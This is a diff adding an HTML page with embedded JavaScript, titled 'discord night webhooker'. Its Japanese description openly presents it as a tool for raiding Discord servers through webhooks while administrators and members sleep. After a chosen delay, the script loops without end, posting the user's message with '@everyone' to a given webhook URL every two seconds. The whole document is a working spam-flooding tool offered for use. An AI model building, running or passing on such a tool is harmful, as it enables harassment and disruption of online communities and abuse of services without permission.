@@ -1,0 +1,126 @@
+<html>
+  <head>
+    <h1><font color="white">discord night webhooker</font></h1>
+    <font color="white">管理者や他のメンバーが寝ている時間を狙ってwebhook荒らしを自動で成功させる事が出来るツールです
+
+    </font>
+    <font color="white">Start timeに入力した時間が経った後連投を開始します。単位は分です
+    </font>
+    <style>
+      body {
+        text-align:center;
+        background-image: url('https://p4.wallpaperbetter.com/wallpaper/625/724/967/simple-background-texture-black-textured-wallpaper-preview.jpg');
+        background-size: cover;
+      }
+      .container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+
+  .input-group {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 1em;
+    width: 25%;
+  }
+
+  .input-group label {
+    font-size: 0.8em;
+    color: #fff;
+    margin-bottom: 0.5em;
+  }
+
+  .input-group input[type="text"],
+  .input-group input[type="number"] {
+    padding: 0.5em;
+    margin: 0.5em;
+    font-size: 1em;
+    width: 100%;
+    border-radius: 5px;
+    border: none;
+    background-color: rgba(255, 255, 255, 0.1);
+    color: #fff;
+  }
+
+  button {
+    padding: 0.5em 1em;
+    font-size: 1em;
+    background-color: #7289DA;
+    color: white;
+    border: none;
+    border-radius: 5px;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="input-group">
+      <label for="webhook-url">Webhook URL</label>
+      <input type="text" id="webhook-url" placeholder="Webhook URL">
+    </div>
+    <div class="input-group">
+      <label for="message">Message</label>
+      <input type="text" id="message" placeholder="Message">
+    </div>
+    <div class="input-group">
+      <label for="start-time">Start time (minutes)</label>
+      <input type="number" id="start-time" placeholder="Start time (minutes)" min="1">
+    </div>
+    <button id="submit-button">Submit</button>
+  </div>
+  <script>
+    const submitButton = document.getElementById("submit-button");
+    submitButton.addEventListener("click", startSending);
+    
+    async function startSending() {
+      const webhookUrl = document.getElementById("webhook-url").value;
+      const message = document.getElementById("message").value;
+      const interval = 2000;
+      const startTime = document.getElementById("start-time").value * 60 * 1000;
+    
+      if (!webhookUrl || !message) {
+        return alert("Webhook URLとメッセージは必須です");
+      }
+    
+      if (interval < 1000) {
+        return alert("送信間隔は1秒以上にしてください");
+      }
+      if (startTime < 0) {
+        return alert("開始時間は0分以上にしてください");
+      }
+    
+      submitButton.disabled = true;
+      submitButton.textContent = "送信中...";
+    
+      await sleep(startTime);
+      while (true) {
+        try {
+          await sendRequest(webhookUrl, message + " @everyone");
+        } catch (error) {
+          console.error(error);
+        } finally {
+          await sleep(interval);
+        }
+      }
+    }
+    
+    async function sendRequest(url, message) {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message }),
+      });
+      return response.json();
+    }
+    
+    function sleep(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+    
+    </script>
+</body>
+</html>
